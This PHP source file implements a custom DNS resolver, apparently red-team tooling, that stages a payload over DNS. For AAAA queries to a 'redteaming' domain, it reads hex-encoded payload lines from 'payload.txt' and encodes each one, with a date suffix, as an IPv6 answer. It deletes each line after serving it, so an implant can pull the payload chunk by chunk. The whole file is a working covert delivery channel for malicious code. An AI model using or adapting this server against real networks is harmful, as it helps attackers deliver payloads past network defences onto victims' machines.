<?php

namespace SimpleNs;

use yswery\DNS\ClassEnum;
use yswery\DNS\RecordTypeEnum;
use yswery\DNS\Resolver\ResolverInterface;
use yswery\DNS\ResourceRecord;

class CustomResolver implements ResolverInterface
{
    /**
     * Return answer for given query.
     *
     * @param ResourceRecord[] $queries
     *
     * @return ResourceRecord[]
     */
    public function getAnswer(array $queries, ?string $client = null): array
    {
        $answers = [];

        foreach ($queries as $query) {
            if ('redteaming.redteam.pl.' === $query->getName() && RecordTypeEnum::TYPE_AAAA === $query->getType()) {
                $answer = new ResourceRecord();
                $answer->setName($query->getName());
                $answer->setClass(ClassEnum::INTERNET);
                $answer->setType(RecordTypeEnum::TYPE_AAAA);
                $payload = 'payload.txt';
                $lines = file($payload);
                if (count($lines) > 0) {
                    $v = 47;
                    $x = str_replace('\x', '', trim($lines[0]));
                    if (strlen($x) < 26) {
                        $q = 26 - strlen($x);
                        $p = str_repeat('0', $q);
                        $x = $x . $p;
                    }
                    $y = date('md') . $v;
                    $z = $x . $y;
                    $aaaa = substr(chunk_split($z, 4, ':'), 0, -1);
                    array_shift($lines);
                    $file = join('', $lines);
                    file_put_contents($payload, $file);
                    var_dump($aaaa);
                } else {
                    $aaaa = 'dead:beef:dead:beef:dead:beef:dead:beef';
                }
                $answer->setRdata($aaaa);
                $answer->setTtl(1);
                $answers[] = $answer;
            }
        }

        return $answers;
    }

    public function allowsRecursion(): bool
    {
        return false;
    }

    public function isAuthority($domain): bool
    {
        return true;
    }

}
